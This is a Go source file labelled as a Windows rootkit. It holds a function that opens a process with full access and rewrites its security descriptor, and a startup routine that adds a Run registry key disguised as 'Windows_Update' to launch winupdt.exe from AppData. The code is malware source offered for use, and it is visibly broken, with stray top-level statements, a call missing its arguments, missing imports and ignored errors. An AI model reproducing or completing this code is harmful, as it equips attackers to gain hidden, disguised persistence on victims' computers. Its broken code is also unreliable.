/*
  *Rootkit for windowws
*/
package rkw

import (
  "unsafe"
  "syscall"
  "github.com/bearmini/go-acl/api"
  "github.com/luisiturrios1/gowin"
  "golang.org/x/sys/windows"
)
CurrProcPid := os.Getpid()
func Croc(pid int) bool{
  handle ,err := syscall.OpenProcess(PROCESS_ALL_ACCESS,false,uint32(pid))
  defer syscall.CloseHandle(handle)
  if err != nil {
    fmt.Errorf("[-] Failed to open process with %v",err)
  }
  //https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
  var SA windows.SecurityAttributes

  SA.Length = unsafe.Sizeof(SA)
  SA.InheritHandle = 0
  if err = convertStringSecurityDescriptorToSecurityDescriptor(

  );err != nil{
    fmt.Errorf("[-] Failed to open process with %v",err)
    return false
  }
  if err = windows.SetKernelObjectSecurity(
      handle,
      api.DACL_SECURITY_INFORMATION,
      SA.SecurityDescriptor);err != nil{
        fmt.Errorf("[-] Failed to open process with %v",err)
    return false
  }
  return true
}

//https://github.com/microsoft/go-winio/blob/7ec923885d90464b9d3ac0efcad87f0cb180da49/zsyscall_windows.go#L109
func convertStringSecurityDescriptorToSecurityDescriptor(str string, revision uint32, sd *uintptr, size *uint32) (err error) {
	var _p0 *uint16
	_p0, err := syscall.UTF16PtrFromString(str)
	if err != nil {
		return
	}
	return _convertStringSecurityDescriptorToSecurityDescriptor(_p0, revision, sd, size)
}

func _convertStringSecurityDescriptorToSecurityDescriptor(str *uint16, revision uint32, sd *uintptr, size *uint32) (err error) {
	r1, _, e1 := syscall.Syscall6(procConvertStringSecurityDescriptorToSecurityDescriptorW.Addr(), 4, uintptr(unsafe.Pointer(str)), uintptr(revision), uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(size)), 0, 0)
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func FixStartUp(){
  RunCommand(`REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe`)
}

func RunCommand(cmd string){
  exec.Command("cmd","/C",cmd).Run()
}
